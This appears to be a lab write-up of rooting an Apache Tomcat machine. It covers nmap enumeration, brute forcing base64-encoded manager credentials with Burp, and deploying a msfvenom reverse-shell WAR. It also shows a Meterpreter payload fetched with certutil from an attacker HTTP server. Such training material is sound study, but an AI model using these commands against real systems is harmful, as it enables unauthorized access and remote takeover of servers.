# Enumeration
- we use nmap for enumeration:![](attachment/8cddd3f669aa81aea34d8653a30213a4.png)
- we found a default webpage (apache tomcat):![](attachment/d02f2dc3192004cfd7585a724d0f1ef8.png)
# Exploitation
- Using burpsuite we find that the password is base64 encoded:![[2024-01-30_17-04.png]
- We can use decoder to decode bas64 and we find that it is in a username:password format![](attachment/a5f1a7ba31b459cc5db0cb05c841e182.png)
-  To do brute forcing we need to convert to Base64:![](attachment/4f60e926b816554f43443b0369c09eac.png)
- To do this for all passwords we need a bash command `for cred in $(cat tomcat_passwds.txt); do echo -n $cred | base64 ; done `' where tomcat_passwds.txt has all default passwords
- Use burpsuite to bruteforce: ![](attachment/e77a9f5d4675c83e9021b93490f5570e.png)![](attachment/03e27f6b79e550cb04c3133bfb5c2bbf.png)
- We found 2 matches: ![](attachment/4ead91fe8752623142e84e771e647cb0.png)
- These are the passwords required:![](attachment/c869f5d1258d6afb864ce672de57603f.png) 
- We create a msfvenom payload with `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.25 LPORT=4444 -f war > reverse.war` then deploy using the previously found credentials.![](attachment/8b49fe36849bd475de6c2b24314a1b21.png)
- listening on netcat using `nc -nlvp 4444` we get an root shell:![](attachment/a2375e2e39e1be7e5fbd328004feeb6b.png)
## Metasploit
- use `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.25 LPORT=4444 -f exe > meterpreter.exe` for creating the  payload
- listen using exploit/multi/handler
- To upload the payload host a http server with `python -m SimpleHTTPServer 80` then use `certutil -urlcache -f http://10.10.14.25/Downloads/Jerry/meterpreter.exe c:\users\administrator\desktop\flags\meterpreter.exe` in the shell and execute the meterpreter.exe file.
- Then we get a meterpreter shell
`